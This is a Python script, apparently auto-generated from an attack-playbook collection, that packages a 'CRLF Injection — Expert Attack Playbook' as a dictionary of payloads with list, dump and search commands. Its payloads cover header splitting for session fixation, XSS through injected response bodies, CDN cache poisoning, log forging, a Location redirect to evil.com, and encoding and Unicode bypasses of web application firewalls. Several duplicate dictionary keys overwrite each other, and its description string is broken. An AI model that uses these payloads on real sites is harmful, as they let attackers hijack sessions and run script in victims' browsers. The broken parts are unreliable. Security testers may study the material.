#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/crlf-injection

Skill: SKILL: CRLF Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-crlf-injection.py --help
      python hack-skills-crlf-injection.py --list
      python hack-skills-crlf-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/crlf-injection'
TITLE = 'SKILL: CRLF Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: crlf-injection", "description: >-", "CRLF injection playbook. Use when user input reaches HTTP response headers, Location redirects, Set-Cookie values, or log files where carriage-return/line-feed characters can split or inject content."],
    'skill-crlf-injection-expert-attack-playbook': [],
    '0-related-routing': ["- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the target is a **Java service** and `%0D%0A` / `\\r\\n` encodings are WAF-blocked \u2014 substituting `\u760d` (U+760D, low byte `\\r`) and `\u760a` (U+760A, low byte `\\n`) injects a real CRLF through Angus Mail / Jakarta Mail SMTP, Apache HttpClient headers, JDK HttpServer responses, and ActiveJ HTTP (re-enables Jira CVE-2025-57733 and JDK CVE-2026-21933 classes)"],
    '1-core-concept': ["CRLF = `\\r\\n` (Carriage Return + Line Feed, `%0D%0A`). HTTP headers are separated by CRLF. If user input is reflected in a response header without sanitization, injecting CRLF characters creates new headers or even a response body.", "Normal: Location: /page?url=USER_INPUT", "Attack: Location: /page?url=%0D%0ASet-Cookie:admin=true", "Result: Two headers \u2014 Location + injected Set-Cookie"],
    '2-detection': [],
    'basic-probe': ["```text", "%0D%0ANew-Header:injected"],
    'in-url-parameter': ["https://target.com/redirect?url=%0D%0AX-Injected:true"],
    'check-response-headers-for-x-injected-true': [],
    'double-crlf-body-injection': ["Two consecutive CRLF sequences end headers and start body:", "```text", "%0D%0A%0D%0A<script>alert(1)</script>"],
    'result': ["HTTP/1.1 302 Found", "Location: /page", "<script>alert(1)</script>"],
    '3-exploitation-scenarios': [],
    'session-fixation-via-set-cookie': ["```text", "%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id"],
    'xss-via-response-body': ["```text", "%0D%0A%0D%0A<html><script>alert(document.cookie)</script></html>"],
    'cache-poisoning': ["If the response is cached by a CDN or proxy, injected headers/body are served to all users:", "```text", "GET /page?q=%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0A%0D%0A<script>alert(1)</script>"],
    'log-injection': ["CRLF in log-visible fields (User-Agent, Referer) can forge log entries:", "```text", "User-Agent: normal%0D%0A127.0.0.1 - admin [date] \"GET /admin\" 200"],
    '4-filter-bypass': ["```text"],
    'unicode-utf-8-bypass': ["%E5%98%8A%E5%98%8D  \u2192 decoded as CRLF in some parsers"],
    'double-url-encoding': ["%250D%250A \u2192 server decodes to %0D%0A \u2192 interpreted as CRLF"],
    'partial-injection-lf-only': ["%0A \u2192 some servers accept LF without CR"],
    '5-real-world-exploitation-chains': [],
    'crlf-session-fixation': ["```text"],
    'inject-set-cookie-via-crlf-in-redirect-parameter': ["?url=%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id"],
    'result': ["HTTP/1.1 302 Found", "Location: /page", "Set-Cookie: PHPSESSID=attacker_controlled_session_id"],
    'victim-uses-attacker-s-session-attacker-hijacks-after-login': [],
    'crlf-xss-via-double-crlf-body-injection': ["```text"],
    'two-crlf-sequences-end-headers-and-inject-response-body': ["?url=%0D%0A%0D%0A<script>alert(document.cookie)</script>"],
    'result': ["HTTP/1.1 302 Found", "Location: /page", "<script>alert(document.cookie)</script>"],
    'crlf-in-302-location-redirect-hijack': ["```text"],
    'inject-new-location-header-before-the-original': ["?url=%0D%0ALocation:http://evil.com%0D%0A%0D%0A"],
    'some-servers-use-the-last-location-header-redirect-to-evil-com': [],
    '6-common-vulnerable-patterns': ["```php", "// PHP \u2014 header() with user input (PHP < 5.1.2 vulnerable):", "header(\"Location: \" . $_GET['url']);", "// Python \u2014 redirect with unsanitized input:", "return redirect(request.args.get('next'))", "// Node.js \u2014 setHeader with user input:", "res.setHeader('X-Custom', userInput);", "// Java \u2014 response.setHeader with user input:", "response.setHeader(\"Location\", request.getParameter(\"url\"));"],
    '7-testing-checklist': ["\u25a1 Inject %0D%0A in redirect URL parameters", "\u25a1 Inject %0D%0A in Set-Cookie name/value paths", "\u25a1 Try double CRLF for body injection \u2192 XSS", "\u25a1 Test encoding bypasses: double-encode, Unicode (%E5%98%8D%E5%98%8A), LF-only (%0A)", "\u25a1 Check if response is cacheable \u2192 cache poisoning", "\u25a1 Test in User-Agent / Referer for log injection", "\u25a1 Test CRLF + Set-Cookie for session fixation", "\u25a1 Verify if Location header can be injected in 302 responses"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()